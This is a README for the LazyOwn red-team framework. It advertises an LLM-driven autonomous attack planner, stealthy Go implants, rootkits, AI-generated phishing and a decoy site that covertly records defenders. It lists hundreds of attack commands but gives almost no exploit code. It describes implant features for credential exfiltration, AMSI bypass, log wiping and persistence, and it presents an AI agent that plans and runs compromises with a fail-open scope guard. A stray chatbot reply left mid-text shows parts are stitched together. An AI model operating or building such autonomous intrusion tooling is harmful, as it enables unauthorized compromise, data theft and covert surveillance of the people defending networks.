**The first C2 framework that plans, executes, and learns autonomously.**

ACI bridges the gap between a natural-language engagement goal and a fully
autonomous execution loop. No competitor (Cobalt Strike, Sliver, Havoc,
Metasploit) does this end-to-end:

```
Operator: "Compromise the domain controller at corp.internal
           starting from a phishing foothold on 10.10.11.5"
         ↓
ACI Planner ──► MITRE ATT&CK decomposition (LLM-backed, static fallback)
                 recon → exploit → exec → privesc → cred → lateral → report
         ↓
ObjectiveStore ─► 20+ concrete objectives injected into sessions/objectives.jsonl
         ↓
auto_loop / autonomous_daemon ─► executes each objective autonomously
         ↓
ACIEngine monitors ─► detects stalled phases (blocked_count ≥ 3)
         ↓
ACIReplan ──► LLM generates alternative techniques for blocked phases
         ↓
ACIReflector ──► appends lessons to sessions/campaign_lessons.jsonl
                 feeds back into the next engagement
```

**Three MCP tools:**

| Tool | What it does |
|------|-------------|
| `lazyown_aci_plan` | Decompose a goal → ATT&CK plan → inject objectives |
| `lazyown_aci_status` | Live phase breakdown, completion %, replan recommendation |
| `lazyown_aci_replan` | Force adaptive replan when stalled; auto-generates lessons |

**Quick-start:**

```python
# 1. Submit the engagement goal
lazyown_aci_plan(
    goal="Compromise the DC at corp.internal",
    target="10.10.11.5",
    scope=["10.10.11.0/24"],
    domain="corp.internal",
    os_hint="windows",
)

# 2. Start autonomous execution
lazyown_auto_loop(target="10.10.11.5", max_steps=20)

# 3. Monitor progress
lazyown_aci_status()

# 4. When blocked (blocked_count >= 3)
lazyown_aci_replan(reason="Kerberoasting blocked by AV, try AS-REP roasting")
```

**What makes ACI unique vs. other tools:**

- Cobalt Strike / Sliver / Havoc are C2 frameworks — the operator plans every step
- Metasploit has automation but no intelligence
- CALDERA emulates fixed ATT&CK procedures but can't adapt to novel environments
- **ACI plans, executes, replans, and learns — continuously, across engagements**

**Persistence:**

| File | Contents |
|------|----------|
| `sessions/aci_plan.json` | Active plan: phases, objectives, completion state |
| `sessions/aci_history.jsonl` | Archived completed/abandoned plans |
| `sessions/campaign_lessons.jsonl` | Lessons extracted by ACIReflector |

**CLI usage (standalone):**

```bash
python3 skills/aci_planner.py plan "Compromise DC" --target 10.10.11.5 --os windows
python3 skills/aci_planner.py status
python3 skills/aci_planner.py replan "technique blocked"
python3 skills/aci_planner.py reflect
```

### Autonomous Daemon — `skills/autonomous_daemon.py`

Four asyncio roles in a single process — no Claude required between steps:

```
Role 1 — ObjectiveLoop      : watches objectives.jsonl, takes + executes
Role 2 — ExecutionEngine    : 6-layer cascade per step, RL Q-table feedback
  Reactive → Parquet → Bridge → SWAN(MoE+RL) → LLM → Fallback
Role 3 — WorldModelWatcher  : graph centrality + pivot candidate tracking
Role 4 — DroneCoordinator   : hive drone spawning on recon/cred/service findings
```

Enable SWAN in the daemon: `export AUTO_USE_SWAN=1` before starting.

ACI feeds into the daemon: objectives injected by `lazyown_aci_plan` are picked
up automatically by Role 1 (ObjectiveLoop) — no additional configuration needed.

### Graph-Based Reasoning — `modules/world_model.py`

NetworkGraph tracks all discovered relationships (hosts, services, credentials, trust paths) and computes normalized degree centrality to surface pivot candidates. The top-3 candidates are injected into every `to_context_string()` call, ensuring the autonomous loop always knows the highest-value lateral movement targets.

## Authorization Scope Guard

A red-team framework that reads its target from `payload.json` has a sharp edge:
a stray `rhost` fires offensive commands at an unauthorized host. The scope guard
is the safety net. Every interactive command flows through a single chokepoint
that checks the active target against your authorized engagement scope before the
command runs.

```bash
(LazyOwn) > scope add 10.10.11.0/24       # CIDR, bare IP, hostname, or *.corp.local wildcard
(LazyOwn) > scope add dc.corp.local
(LazyOwn) > scope mode enforce            # off | warn (default) | enforce
(LazyOwn) > scope                         # show current scope and posture
```

- **Fail-open by design**: dormant while the scope is empty or the mode is `off`,
  so existing campaigns are unaffected until you opt in. Any internal error
  allows the command rather than blocking the operator.
- **`warn`** annotates out-of-scope offensive commands; **`enforce`** blocks them
  pending explicit confirmation (and refuses in non-interactive sessions).
- Only offensive kill-chain categories are gated; reporting, configuration and
  local helpers always run. New offensive `do_*` commands are auto-classified.
- Stored in `payload.json` (`scope`, `scope_enforcement`); pure logic lives in
  `cli/scope_guard.py` with zero coupling to the shell.

## Reproducible installs

Dependencies are declared once in `pyproject.toml` (single source of truth) and
pinned for reproducible installs:

- `requirements.txt` — cross-platform core lock (no CUDA wheels).
- `requirements-ml.txt` — optional, heavy ML stack (torch/CUDA, scikit-learn).
- `install.sh` runs under strict mode, is idempotent, and accepts `--no-ml`
  (skip the 2 GB ML stack) and `--no-ollama` (skip the local LLM runtime).
- Developers: `pip install -e .[ml,dev]`.

## Key Features

1. **Comprehensive Attack Library**: Over 500 attack techniques for Linux, Unix, BSD, macOS, and Windows environments, augmented by the Atomic Red Team Framework library.
2. **Interactive CLI**: Based on cmd2, offering an intuitive and efficient command-line experience.

![image](https://github.com/user-attachments/assets/bac38447-1ab9-40f0-babb-7afa3cbe6a25)

3. **Decoy**: if the ip addres not match with 127.0.0.1 or lhost flask will show a decoy website this decoy site will record a video with audio and take pictures from the intruder (sessions/captured_images) like a small versión of storm breaker to know who is the blueteam operator

![image](https://github.com/user-attachments/assets/17f36120-3a17-4ee3-9358-8f4f6caa07bf)


4. **Adversary Simulation**: Advanced capabilities for generating red team operation sessions, ensuring meticulous and effective simulations.

![adversay emulator](https://github.com/user-attachments/assets/dc6e3ca2-c70d-46c5-9240-488bbea409ce)

5. **Task Scheduling**: Utilize the `cron` command to schedule and automate tasks, enabling persistent threat simulations.
6. **Real-Time Results**: Obtain immediate feedback and results from security assessments, ensuring timely and accurate insights.
7. **RAT and Botnet Capabilities**: Includes features for remote access and control, allowing for the management of botnets and persistent threats.
8. **C2 Framework IA Powered**: Acts as a command and control (C2) framework, enabling covert communication and control over compromised systems. and many IA bots to improve your opsec, Developed in Flask, providing a user-friendly interface for seamless interaction. Now with network discovery capabilities, allowing us to see the attack surface on our client map clearly and intuitively with filters and a search panel. New functionalities are coming soon.
![image](https://github.com/user-attachments/assets/f0b61d32-a67d-4036-809e-1d6f5e872057)

![vulnbot](https://github.com/user-attachments/assets/86ae6384-f61b-41be-8b87-222399bf2b77)

- **C2 LazyAddon Creator**: Guided `/addons` pages in the C2 dashboard to author `lazyaddons/*.yaml` integrations without touching YAML by hand. One form exposes every addon option (name, description, author, version, enabled, target OS, trigger services, category, module type, install type, parameters, tool block, C2 extras, environment variables) with tooltips, placeholders, and per-field help. Placeholder chips (`{rhost}`, `{url}`, declared params, and every payload.json key) are drag-and-drop into command boxes. Server-side validation rejects unsafe names, path traversal, unknown placeholders, and malformed URLs before the file is written atomically; the list and YAML preview pages complete the lifecycle. Every mutating route is CSRF-protected. Contract: `lazyc2/addon_creator.py` + `lazyc2/blueprints/addons.py`, covered by `tests/test_addon_creator.py` and the `tests/run_mutation_addon_creator.py` mutation gate.


9. **Undetectable, Obfuscated, and Malleable GO Implants**: The command with the payload comes obfuscated by default. Instead of directly downloading the beacon, it downloads a stub created in C to download the beacon, which is XOR-encoded with a key. It is then decoded in memory and executed in a temporary path with a unique name to evade detection, using svchost in Windows and lazyservice in Linux. This performs a two-stage implant, which has been tested on Kernel 6.12 and Windows [Version 10.0.20348.3807]. Additionally, an alternative Windows stub using LOLBAS PS1 and Csharp has been added, along with a version of ebird3 in LOLBAS that uses the same technologies. The Go beacon is a multi-platform, undetectable, and highly obfuscated implant tailored for advanced red teaming operations. It features polymorphism, operates in a configurable stealth mode, and secures communications with AES-256 encrypted channels. The beacon blends into environments by simulating legitimate network traffic and evades detection by identifying virtual machines, sandboxes, containers, and debuggers, dynamically adjusting its behavior. With a minimal footprint, it supports robust network discovery through ping-based host enumeration and port scanning of configured targets. The implant excels at exfiltrating sensitive data, including private keys, AWS credentials, browser credentials, and system logs. It offers dynamic TCP proxying for traffic redirection, privilege escalation attempts, and system log cleaning. Persistence is achieved across Windows, Linux, and macOS via scheduled tasks, systemd, crontab, and LaunchAgents. Additional capabilities include adversary emulation (MITRE ATT&CK), file timestamp obfuscation, and directory compression for exfiltration. Built with Go vet for code health, the implant integrates seamlessly with Dockerized environments and AWS Firecracker microVMs, making it a cornerstone of modern red team infrastructure, Built with Go vet for code integrity, the implant leverages Cloudflare for traffic obfuscation, routing communications through secure, high-performance redirectors to conceal C2 infrastructure. The Go binary is hardened with Garble obfuscation, thwarting reverse engineering and signature-based detection. On Windows, the implant employs extension camouflage to masquerade as benign files (e.g., `.pdfx`) and embeds custom icons via `rsrc` for convincing social engineering.

![image](https://github.com/user-attachments/assets/4e114c5c-d28d-4570-9e02-6868bb838dd2)

- **Available beacon commands**:
 - **stealth_off** stop being stealthy, Disables stealth mode, allowing normal operations.
 - **stealth_on** enter ninja mode, Enables stealth mode, minimizing activity to avoid detection.
 - **download:** download:[filename] Downloads a file from the C2 to the compromised host.
 - **upload:** [filename]: Uploads a file from the compromised host to the C2.
 - **rev:** Establishes a reverse shell to the C2 using the configured port.
 - **exfil:** Exfiltrates sensitive data (e.g., SSH keys, AWS credentials, command histories).
 - **download_exec:** download_exec:[url]: Downloads and executes a binary from a URL (Linux only, stored in /dev/shm).
 - **obfuscate:** [filename]: Obfuscates file timestamps to hinder forensic analysis.
 - **cleanlogs:** Clears system logs (e.g., /var/log/syslog on Linux, event logs on Windows).
 - **discover:** Performs network discovery, identifying live hosts via ping.
 - **adversary:**[id_atomic]: Executes an adversary emulation test (MITRE ATT&CK) using downloaded atomic redteam framework scripts.
 - **softenum:** Enumerates useful software on the host (e.g., docker, nc, python).
 - **netconfig:** Captures and exfiltrates network configuration (e.g., ipconfig on Windows, ifconfig on Linux).
 - **escalatelin:** Attempts privilege escalation on Linux (e.g., via sudo -n or SUID binaries).
 - **proxy:**[listenip]:[listenport]:[targetip]:[targetport] Starts a TCP proxy redirecting traffic from listenAddr to targetAddr.
 - **stop_proxy:**[listenaddr] Stops a TCP proxy on the specified address.
 - **portscan:** Scans ports on discovered hosts and the configured rhost.
 - **compressdir:**[directory]: Compresses a directory into a .tar.gz file and exfiltrates it.
 - **sandbox:** Get info about the system if it's a sandbox or not.
 - **isvm:** Get info about the system if it's a virtual machine or not.
 - **debug:** Get info about the system if the target is debugged or not.
 - **persist:** Try to persist mechanism in the target system.
 - **simulate:** Execute a simulation of a legit web page like youtube.
 - **migrate:** Inject a payload into a suspended process and resume it. If no payload is specified, the current process is injected (self-migration).
 - **shellcode:** Download and execute a shellcode in memory. Supports multiple operative systems and formats msfvenom friendly (in windows the technique used is Early brid APC Injection).
 - **amsi:** Bypass AMSI (Anti-Malware Scan Interface) on Windows systems to evade detection by PowerShell, WMI, and other scripting engines.
 - **terminate:** Terminates the implant or beacon, removing files and persistence mechanisms.

![winimp](https://github.com/user-attachments/assets/4d892bfa-f067-483d-b087-0afea628c00c)


10. **Rootkit**: Linux rootkit and Windows Malware to ensure persistence and undetectable.
11. **Surface attack**: We are pleased to document the new surface attack functionality. This feature allows the operator to upload a ZIP archive of Bloodhound capture data (validated with bloodhound.py) at any time via the main page. Upon upload, the system will render the complete attack surface, augmented with identified machines discovered through automated methods or system commands such as **lazynmap** (At WebCli can you click at the Host Icon and will paste the command to discover that host.), **nmap**, **discovery**, and **run lazynmapdiscovery**. These supplementary data sources will enrich the graphical representation, populating nodes within the attack surface. The interface will provide integrated controls for searching, filtering, enumerating, and correlating the various attack vectors. It is crucial to note that this feature is not intended as a replacement for Bloodhound. Its scope is limited to providing a rapid overview and efficient filtering of collected information to facilitate attack phase planning. For detailed attack guidance and exploitation, the operator is directed to the established Bloodhound toolset.

![image](https://github.com/user-attachments/assets/747773c6-4eb0-4dba-a51d-113cdffca959)

12. **Phishing campaigns**: The phishing module in the LazyOwn RedTeam Framework is a sophisticated component designed for simulating advanced phishing campaigns in ethical red teaming and security awareness training. It integrates artificial intelligence (AI), dynamic URL generation, comprehensive tracking, and behavioral analysis to create realistic and evasive phishing simulations. The module is built on a Flask-based backend with a Jinja2 frontend, leveraging SQLite for data persistence, YAML for configuration, and Groq AI for content generation and analysis. Below is a detailed enumeration of its features, technical implementation, and usage instructions.
- **Description**: The module uses the Groq AI (e.g., Mixtral-8x7b model) to generate context-aware phishing email templates tailored to specific campaigns. Templates are dynamically created based on user-defined parameters, such as target audience, theme (e.g., corporate, financial), and desired tone (e.g., urgent, professional).
- **Technical Implementation**: Templates are generated via Bot (Local Deepseek) and API calls to Groq (Remote), with prompts specifying template structure, language, and embedded placeholders (e.g., {name}, {beacon_url} and {tracking_pixel}).
- Generated templates are stored as HTML or plain text in the templates directory with unique identifiers (e.g., ai_template_1749691010.0413928).
- Integration with the campaign configuration allows embedding obfuscated URLs and tracking beacons.
- Automated creation of a short url for every beacon created
![image](https://github.com/user-attachments/assets/fdc0e32a-be7d-4c98-a5e5-c80cbbf79f93)
![image](https://github.com/user-attachments/assets/6b9c576e-182a-4d0d-8b70-f11109be005f)
![image](https://github.com/user-attachments/assets/1065efbd-6c72-4eba-b7be-a188f1ec8dbb)
- **Testing Endpoints Feature**
To facilitate rapid testing and verification of generated phishing templates, the LazyOwn RedTeam Framework now includes the capability to create arbitrary test endpoints. This feature allows users to quickly deploy and preview their phishing email templates directly within the framework.

Description: This enhancement introduces a user-friendly method to create new web endpoints that serve specific HTML templates. This is particularly useful for immediately inspecting the rendering and content of AI-generated templates without needing to integrate them into a full campaign.

Technical Implementation:

A new Flask route (/mkendpoint) and a corresponding HTML form have been added.

The form allows users to specify two key parameters:

Endpoint Name: The desired name for the new URL endpoint (e.g., landing). The full URL will be /your_app_root/{endpoint_name}.

Template File: The filename of the HTML template (located within the templates directory, e.g., ai_template_1749691010.0413928).

Upon submission, the framework dynamically registers a new route in the Flask application that, when accessed, renders the specified template.

Usage Instructions:

Navigate to the /mkendpoint URL in your LazyOwn RedTeam Framework instance.

Fill out the form with the desired Endpoint Name and the Template File you wish to test. Ensure the template file name is correct and exists in the templates directory.

Click the "Create Route" button.

Once created, you can access your test endpoint by navigating to the URL constructed using the specified Endpoint Name (e.g., /landing). This will display the content of the chosen template.

Further Capabilities (Implicit from Provided Code):

While the current implementation focuses on serving the template, the underlying Flask routing allows for future expansion to handle information sent to these test endpoints. Similar to regular campaign endpoints, you could potentially:

Capture Information: Modify the test_endpoint_view function to capture data submitted via GET or POST requests to the test endpoint. This data could be logged or displayed for testing purposes.

Access Session ID: The Flask session is available within the view function, allowing you to track and utilize session identifiers if needed for more complex testing scenarios.

This feature streamlines the testing process and provides a convenient way to quickly preview and verify your AI-powered phishing templates.


## Command Capabilities

LazyOwn provides a rich set of commands available from both the CLI and web interface:

- **addhosts**: Add the domain and rhost to /etc/hosts file to route the attacks.
- **aliass**: Show all documented commands alias (use 'help -v' for verbose/'help <topic>' for details or use aliass)
- **list**: Enumerates all available LazyOwn Modules within the framework, providing a comprehensive overview of the toolkit's capabilities.
- **assign**: Configures specific parameters for the operation, such as `assign rhost 192.168.1.1` to define the target IP address, ensuring precise and tailored attacks.
- **createcredentials**: Add credentials exfiltrated to be used in the attacks or tests. `createcredentials admin:adminpassword`
- **show**: Displays the current values of all configured parameters, offering a clear and concise view of the operational setup.
- **run** : Executes specific scripts available in the framework, such as `run lazysniff` to initiate packet sniffing, enabling dynamic and responsive security assessments.
- **cron**: Schedules tasks to run at specified intervals, ensuring persistent and automated threat simulations that mimic the relentless nature of advanced cyber adversaries.
- **exit**: Gracefully exits the CLI, concluding the session with elegance and finality.
- **auto**: Execute all tools files enabled in the tool directory that are relevant to the Nmap scan report.
- **help**: Documented commands (use 'help -v' for verbose/'help <topic>' for details)
- **history**: show the history of the commands in the cli.
- **edit**: An vim to edit files
- **ipy**: An Ipython3 interpreter

Originally designed to automate the search and analysis of binaries with special permissions on Linux and Windows systems, LazyOwn has evolved to encompass a broader range of functionalities. The project includes scripts that extract information from GTFOBins, analyze binaries on the system, and generate options based on the collected data.

# Extending LazyOwnShell with Lua Plugins

This document explains how to use Lua scripting to extend the functionality of the `LazyOwnShell` application, which is built on top of the `cmd2` framework in Python. Lua allows you to write custom plugins that can add new commands, modify existing behavior, or access application data.

![image](https://github.com/user-attachments/assets/aff3eba8-ea3a-408c-9de5-6f09d6c30a93)

---

## Table of Contents

1. [Introduction](#introduction)
2. [Setting Up Lua Plugins](#setting-up-lua-plugins)
3. [Writing Lua Plugins](#writing-lua-plugins)
4. [Registering New Commands](#registering-new-commands)
5. [Accessing Application Data](#accessing-application-data)
6. [Error Handling](#error-handling)
7. [Example Plugins](#example-plugins)
8. [Best Practices](#best-practices)

---

## 1. Introduction

The `LazyOwnShell` application supports Lua scripting to allow users to extend its functionality without modifying the core Python code. Lua scripts (plugins) are stored in the `plugins/` directory and are automatically loaded when the application starts.

Lua plugins can:
- Add new commands to the shell.
- Modify existing commands or behaviors.
- Access and manipulate application data exposed by Python.

---

## 2. Setting Up Lua Plugins

To use Lua plugins, ensure the following:

1. Install the `lupa` library in your Python environment:
   ```bash
   pip install lupa
   ```
   ```bash
   plugins/
        init_plugins.lua
        hello.lua
        goodbye.lua
   ```
   When the application starts, it will execute init_plugins.lua, which loads all other .lua files in the plugins/ directory.

2. Writing Lua Plugins
   A Lua plugin is a script file with the .lua extension placed in the plugins/ directory. Each plugin can define functions and register them as commands in the shell.

Structure of a Lua Plugin

   ```lua
    -- Define a function for the new command
    function my_command(arg)
        -- Your logic here
        print("This is a new command: " .. (arg or "default"))
    end

    -- Register the function as a command
    register_command("my_command", my_command)
   ```
Key Functions
- register_command(command_name, lua_function):
- Registers a new command in the shell.
- command_name: The name of the command (e.g., hello).
- lua_function: The Lua function to execute when the command is called.

3. Registering New Commands

    To add a new command to the shell, follow these steps:

- Define a Lua function that implements the command logic.
- Use register_command to register the function as a command.
- Example: Adding a hello Command
- Create a file plugins/hello.lua with the following content:

   ```lua
    function hello(arg)
        local name = arg or "world"
        print("Hello, " .. name .. "!")
    end

    register_command("hello", hello)
   ```
Now, you can run the hello command in the shell:
    ```bash
    hello Lua
    Hello, Lua!
    ```
4. Best Practices
- Keep Plugins Modular : Each plugin should focus on a single feature or functionality.
- Document Your Plugins : Provide clear documentation for each plugin, including usage examples.
- Test Thoroughly : Test your plugins in isolation before integrating them into the main application.
- Handle Errors Gracefully : Use pcall to handle errors in Lua plugins and prevent crashes.

By leveraging Lua scripting, you can extend the functionality of LazyOwnShell without modifying the core Python code. This allows for greater flexibility and customization, enabling users to write their own plugins to meet specific needs. Happy coding!

# LazyAddons YAML System

Extending the LazyOwn RedTeam Framework's capabilities has never been so easy, even for non-programmers, thanks to the LazyAddons system that allows for extending functionalities using YAML files.

Declarative command creation through YAML configuration files.

## 📂 File Structure
lazyaddons/
├── addon1.yaml
├── addon2.yaml
└── example.yaml


## 🛠️ Addon Definition

### Minimal Example
```yaml
name: "shortname"  # CLI command (do_shortname)
enabled: true
description: "Tool description for help system"

tool:
  name: "Full Tool Name"
  repo_url: "https://github.com/user/repo"
  install_path: "tools/toolname"
  execute_command: "python tool.py -u {url}"
```
Advanced Configuration
```yaml
params:
  - name: "url"
    required: true
    description: "Target URL"
    default: "http://localhost"

  - name: "threads"
    required: false
    default: 4
```
✨ Features
Auto-Installation
Tools clone from Git when missing:

```bash
git clone <repo_url> <install_path>
```
Parameter Substitution
Replaces {param} in commands with values from:

- Command arguments

- Default values

- self.params

- Help Integration

help <command> displays the YAML description.

🧩 Template

```yaml
name: ""
enabled: true
description: ""

tool:
  name: ""
  repo_url: ""
  install_path: ""
  install_command: ""  # Optional
  execute_command: ""

params:
  - name: ""
    required: true/false
    default: ""
    description: ""
```
▶️ Usage
Place YAML files in lazyaddons/

Start your CLI application

Execute registered commands:

```bash
(Cmd) help your_command
(Cmd) your_command -args
```
🚨 Troubleshooting
Missing parameters: Verify required fields in YAML

Install failures: Check network/git access

Command errors: Validate execute_command syntax


Key features:
- Clean GitHub-flavored markdown
- Focused only on YAML addons
- Includes ready-to-use templates
- Documents the parameter substitution system
- Provides troubleshooting tips

Would you like me to add any specific examples or usage scenarios?

![LazyOwnGris3](https://github.com/user-attachments/assets/04f48e49-5d7f-4c3d-af6d-81d05dbdacbf)


LazyOwn on Reddit

Revolutionize Your Pentesting with LazyOwn: Automate the intrusion on Linux, MAC OSX, and Windows VICTIMS

<https://www.reddit.com/r/LazyOwn/>


<https://github.com/grisuno/LazyOwn/assets/1097185/eec9dbcc-88cb-4e47-924d-6dce2d42f79a>

Discover LazyOwn, the ultimate solution for automating the pentesting workflow to attack Linux, MacOSX and Windows systems. Our powerful tool simplifies pentesting, making it more efficient and effective. Watch this video to learn how LazyOwn can streamline your security assessments and enhance your cybersecurity toolkit.

```sh
LazyOwn> assign rhost 192.168.1.1
[SET] rhost set to 192.168.1.1
LazyOwn> run lazynmap
[INFO] Running Nmap scan on 192.168.1.1
...
```

LazyOwn is ideal for cybersecurity professionals seeking a centralized and automated solution for their pentesting needs, saving time and enhancing efficiency in identifying and exploiting vulnerabilities.

![Captura de pantalla 2024-05-22 021136](https://github.com/grisuno/LazyOwn/assets/1097185/9a348e76-d667-4526-bdef-863159ba452d)

## Requisitos

- Python 3.x
- Módulos de Python:
    - requests
    - python-libnmap
    - pwncat-cs
    - pwn
    - groq
    - PyPDF2
    - docx
    - python-docx
    - olefile
    - exifread
    - pycryptodome
    - impacket
    - pandas
    - colorama
    - tabulate
    - pyarrow
    - keyboard
    - flask-unsign
    - name-that-hash
    - certipy-ad
    - ast
    - pykeepass
    - cmd2
    - Pillow
    - netaddr
    - stix2
    - pyautogui

- `subprocess` (incluido en la biblioteca estándar de Python)
- `platform` (incluido en la biblioteca estándar de Python)
- `tkinter` (Opcional para el GUI)
- `numpy` (Opcional para el GUI)
-

## Instalación

1. Clona el repositorio:

```sh
git clone https://github.com/grisuno/LazyOwn.git
cd LazyOwn
```

2. Instala las dependencias de Python:

```sh
./install.sh
```

## Uso

![image](https://github.com/user-attachments/assets/6ce124bf-035e-489a-9393-d2b0712b808c)


```sh
./run or ./fast_run_as_r00t.sh

./run --help
    [;,;] LazyOwn vvvrelease/0.2.8
    Usage: ./run [Options]
    Options:
      --help             Show this help panel.
      -v                 Show version.
      -p <payloadN.json> Exec with different payload.json example. ./run -p payload1.json, (Special for RedTeams)
      -c <command>       Exec a command using LazyOwn example: ping
      --no-banner        No Banner
      -s                 Run as root
      --old-banner       Show old Banner


./fast_run_as_r00t.sh --vpn 1 (the number id of your file in vpn directory)
```

```
Use assign <parameter> <value> to configure parameters.
Use show to display the current parameter values.
Use run <script_name> to execute a script with the set parameters.
Use exit to exit the CLI.

Once the shell is running, you can use the following commands:

list: Lists all LazyOwn Modules.
assign <parameter> <value>: Sets the value of a parameter. For example, assign rhost 192.168.1.1.
show: Displays the current values of all parameters.
run <script>: Executes a specific script available in the framework.
Available Scripts

┌─[👤grisun0 (LazyOwn👽kali) ~/home/grisun0/LazyOwn][127.0.0.1][http://VariaType.htb] 🌐192.168.1.120 ✗ feature/lazyllmchat-assistant (🐍env)
└╼ $ help

01. Reconnaissance
──────────────────
alterx        finalrecon       ping             trace                  
apache_users  getcap           ports            trufflehog             
binarycheck   gospider         proxy            tshark_analyze         
cve           graudit          recon            waybackmachine         
dig           httprobe         serveralive2     whatweb                
dnschef       ipinfo           sherlock         windapsearchscrapeusers
dnsenum       launchpad        sslscan        
dnsmap        metabigor        tcpdump_capture
dnstool_py    openssl_sclient  tcpdump_icmp   

02. Scanning & Enumeration
──────────────────────────
ad_ldap_enum  enum4linux_ng     nbtscan              rpcdump             wpscan
allin         evil_ssdp         net_rpc_addmem       rpcmap_py         
amass         feroxbuster       netexec              samrdump          
arjun         finger_user_enum  netview              sawks             
arpscan       fuzz              nikto                sessionssh        
batchnmap     getnpusers        nmapscript           skipfish          
bbot          gobuster          nuclei               smbattack         
blazy         hound             odat                 smbclient         
bloodhound    kerbrute          openredirex          smbclient_impacket
breacher      lazynmap          osmedeus             smbclient_py      
certipy       ldapdomaindump    parsero              smbmap            
certipy_ad    ldapsearch        parth                smtpuserenum      
changeme      lookupsid         portdiscover         snmpcheck         
cme           lookupsid_py      portservicediscover  snmpwalk          
davtest       loxs              pre2k                swaks             
dirsearch     lynis             pykerbrute           vscan             
dmitry        magicrecon        rdp_check_py         wfuzz             
enum4linux    mqtt_check_py     rpcclient            windapsearch      

03. Exploitation
────────────────
aclpwn_py         gettgtpkinit_py  psexec            sqlmap                    
addspn_py         greatSCT         psexec_py         sqsh                      
autoblody         img2cookie       py3ttyup          ss                        
cacti_exploit     jwt_tool         pyautomate        sshexploit                
commix            krbrelayx_py     pyoracle2         template_helper_serializer
cp                kusa             pywhisker         ticketer                  
createcookie      lazypwn          rejetto_hfs_exec  unicode_WAFbypass         
createdll         lfi              rev               upload_bypass             
digdug            lol              seo               utf                       
download_exploit  ms08_067_netapi  sharpshooter      winbase64payload          
downloader        ntpdate          shellfire         wrapper                   
eternal           owneredit        shellshock        www                       
excelntdonut      padbuster        sireprat          xss                       
filtering         powerserver      sqli              xsstrike                  
gets4uticket_py   printerbug_py    sqli_mssql_test 

04. Post-Exploitation
─────────────────────
add2find                     exe2bin              pezorsh              
adversary                    exe2donutbin         pip_proxy            
adversary_yaml               extract_yaml         pip_repo             
aes_pe                       find                 powershell_cmd_stager
ai_playbook                  follina              rmfromfind           
apt_proxy                    hex2shellcode        rubeus               
apt_repo                     internet_proxy       scavenger            
atomic_lazyown               issue_command_to_c2  scp                  
bin2shellcode                lazywebshell         service_ssh          
convert_remcomsvc_from_file  mimikatzpy           sessionsshstrace     
cports                       msfshellcoder        shellcode            
create_synthetic             ofuscate_string      shellcode2elf        
createpayload                ofuscatesh           shellcode2sylk       
d3monizedshell               ofuscatorps1         shellcode_search     
disableav                    path2hex             ssh_cmd              

05. Persistence
───────────────
asprevbase64       ftp                msfpc                 setoolKits
backdoor_factory   generate_revshell  paranoid_meterpreter  ssh       
conptyshell        grisun0            pwncat                toctoc    
createrevshell     grisun0w           pwncatcs              veil      
createwebshell     ivy                rdp                   weevely   
createwinrevshell  knokknok           revwin                weevelygen
darkarmour         listener_go        scarecrow           
dr0p1t             listener_py        service             

06. Privilege Escalation
────────────────────────
responder  smbserver

07. Credential Access
─────────────────────
addusers                cred          john2hash        rocky           
adsso_spray             creds_py      john2keepas      searchhash      
cewl                    crunch        john2zip         smalldic        
crack_cisco_7_password  cubespraying  keepass          spraykatz       
createcredentials       dacledit      medusa           sshkey          
createhash              generatedic   passtightvnc     sudo            
createmail              hashcat       passwordspray    transform       
createusers_and_hashs   hydra         refill_password  username_anarchy

08. Lateral Movement
────────────────────
addcli     id_rsa           penelope         sshd               wifipass  
bloodyAD   lateral_mov_lin  regeorg          stormbreaker       wmiexec   
chisel     ligolo           rnc              targetedKerberoas  wmiexecpro
dcomexec   mssqlcli         set_proxychains  tord             
getTGT     nc               shadowsocks      upload_c2        
gospherus  ngrok            socat            vpn              

09. Data Exfiltration
─────────────────────
adgetpass    dploot    evilwinrm     getuserspns  reg_py    secretsdump  
decrypt      encrypt   getadusers    gitdumper    rsync     unzip        
download_c2  evidence  getnthash_py  gmsadumper   samdump2  upload_gofile

10. Command & Control
─────────────────────
atomic_agent  automsf     emp3r0r                mitre_test   sliver_server
atomic_gen    c2          empire                 msf        
atomic_tests  caldera     generate_playbook      msfrpc     
attack_plan   duckyspark  iis_webdav_upload_asp  my_playbook

11. Reporting
─────────────
apropos                  createtargets          gpt             process_scans
banners                  download_malwarebazar  groq            pth_net      
c2asm                    extract_ports          img2vid         pup          
camphish                 eyewitness             malwarebazar    vulns        
create_session_json      eyewitness_py          morse         
createjsonmachine        get_avaible_actions    name_the_hash 
createjsonmachine_batch  gowitness              nmapscripthelp

12. Miscellaneous
─────────────────
acknowledgearp   clone_site          getseclist        links         run      
acknowledgeicmp  cron                graph             list          sh       
addhosts         decode              h                 load_session  show     
aliass           download_resources  hex_to_plaintext  nano          sys      
assign           encode              ignorearp         news          tab      
banner           encoderpayload      ignoreicmp        payload       urldecode
base64decode     encodewinbase64     ip                pwd           urlencode
base64encode     exit                ip2asn            qa            v        
check_update     fixel               ip2hex            rhost       
clean            fixperm             kick              rot         
clock            gencert             lazyscript        rotf        

13. Lua Plugin
──────────────
generate_c_reverse_shell          lolbas_certutil_download_exec
generate_cleanup_commands         lolbas_certutil_exe          
generate_html_payload             lolbas_mshta_js              
generate_lateral_command          lolbas_mshta_reverse_shell   
generate_linux_asm_reverse_shell  lolbas_rundll32_dll          
generate_linux_raw_shellcode      lolbas_wmic_xsl_execution    
generate_lolbird                  parse_nmap_with_xmlstarlet   
generate_msfvenom_loader          run_nuclei_on_nmap_files     
generate_msfvenom_loader_windows  run_python_rev_c2            
generate_reverse_shell            rundll32_sct_from_url        
generate_stub                     validate_shellcode           
kerberos_harvest                  visualize_network            
lolbas_bitsadmin_exe            

14. Yaml Addon.
───────────────
AdaptixC2                 GoPEInjection      OverRide
agentzero                 gosearch           peeko
argfuscator               gui                pretender
ATTPwn                    gui2               PTMultiTools
AuroraPatch               hack_browser_data  PTMultiTools_scan
banner_tool               hellbird           PyinMemoryPE
bbr                       hive               pyrit
beacon                    hooka_linux_amd64  raven
blacksandbeacon           hostdiscover       ridenum
blacksandbeacon_bof       kivi_revshell      setoolkit
cgoblin_windows           laps               ShadowLink
Clematis                  lazyaddon_creator  shellcode_custom_win_rev_tcp_xored
commix2                   lazyagentAi        SigPloit
copy-fail-CVE-2026-31431  lazybinenc         spoonmap
CVE-2022-22077            lazyftpsniff       stratus_detonate
CVE_2025_24071_PoC        LazyLoader         stratus_list
demiguise                 lazymapd           toposwarm
ebird3                    lazyownbt          unicorn
evilginx2                 LazyOwnExplorer    upxdump
gcr                       llm                vulnbot
gemini-cli                NullGate           vulnbot_groq
gen_dll_rev               oniux              vulnhuntr
Get_ReverseShell          opencode_adapter   watchguard
githubot                  orpheus            wspcoerce
gomulti_loader_linux
